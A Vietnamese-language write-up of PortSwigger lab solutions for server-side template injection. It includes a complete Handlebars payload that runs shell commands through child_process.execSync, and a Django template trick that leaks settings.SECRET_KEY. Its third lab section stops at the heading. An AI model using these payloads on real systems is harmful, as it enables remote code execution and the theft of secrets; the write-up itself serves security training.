# Server side template injection

## **Lab: Server-side template injection in an unknown language with a documented exploit**

[Lab: Server-side template injection in an unknown language with a documented exploit | Web Security Academy](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)

- Trước hết, khi vào web và nhấn xem sản phẩm đầu tiên, nhận về thông báo lỗi
    
    ![image.png](Server%20side%20template%20injection/image.png)
    
- Trong phần mềm Burpsuite, quan sát thấy có request đến API `/` với query `message=Unfortunately%20this%20product%20is%20out%20of%20stock` ⇒ phía server nhận vào một query message và hiển thị nó lên giao diện cho người dùng ⇒ có thể code dùng render template để hiện thị giá trị của `message` lên giao diện ⇒ khả năng có SSTI
- Thực hiện nhập payload `{{7*'7'}` và quan sát response báo lỗi ⇒ server sử dụng `Handlebars`
    
    ![image.png](Server%20side%20template%20injection/image%201.png)
    
- Thực hiện tìm cách khai thác theo trang này [PayloadsAllTheThings/Server Side Template Injection/JavaScript.md at master · swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/JavaScript.md)
- Thực hiện dùng payload sau và RCE thành công
    
    ```jsx
    {{#with "s" as |string|}}
      {{#with "e"}}
        {{#with split as |conslist|}}
          {{this.pop}}
          {{this.push (lookup string.sub "constructor")}}
          {{this.pop}}
          {{#with string.split as |codelist|}}
            {{this.pop}}
            {{this.push "return require('child_process').execSync('ls -la');"}}
            {{this.pop}}
            {{#each conslist}}
              {{#with (string.sub.apply 0 codelist)}}
                {{this}}
              {{/with}}
            {{/each}}
          {{/with}}
        {{/with}}
      {{/with}}
    {{/with}}
    ```
    
    ![image.png](Server%20side%20template%20injection/image%202.png)
    
- Thực hiện xóa file. Hoàn thành giải lab
    
    ![image.png](Server%20side%20template%20injection/image%203.png)
    
    ![image.png](Server%20side%20template%20injection/image%204.png)
    

## **Lab: Server-side template injection with information disclosure via user-supplied objects**

[Lab: Server-side template injection with information disclosure via user-supplied objects | Web Security Academy](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-information-disclosure-via-user-supplied-objects)

- Thực hiện đăng nhập vào tài khoản `content-manager:C0nt3ntM4n4g3r` . Tại trang chủ, thực hiện chọn một sản phẩm bất kỳ
    
    ![image.png](Server%20side%20template%20injection/image%205.png)
    
- Sau đó thực hiện chức năng `Edit template`
    
    ![image.png](Server%20side%20template%20injection/image%206.png)
    
- Tại đây, có thể chỉnh sửa template ⇒ thử truyền payload `{{7*'7'}}` ⇒ có lỗi trong response ⇒ sử dụng `django`.
    
    ![image.png](Server%20side%20template%20injection/image%207.png)
    
- Vì `django` sẽ chặn không cho thực hiện các phép toán mà chỉ hiển thị biến, thuộc tính của object, hoặc các **Filters**.
- Vì vậy, chúng ta có thể chèn payload `settings.SECRET_KEY`để lấy key và submit. Hoàn thành việc giải lab
    
    ![image.png](Server%20side%20template%20injection/image%208.png)
    

## **Lab: Server-side template injection in a sandboxed environment**

[Lab: Server-side template injection in a sandboxed environment | Web Security Academy](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-a-sandboxed-environment)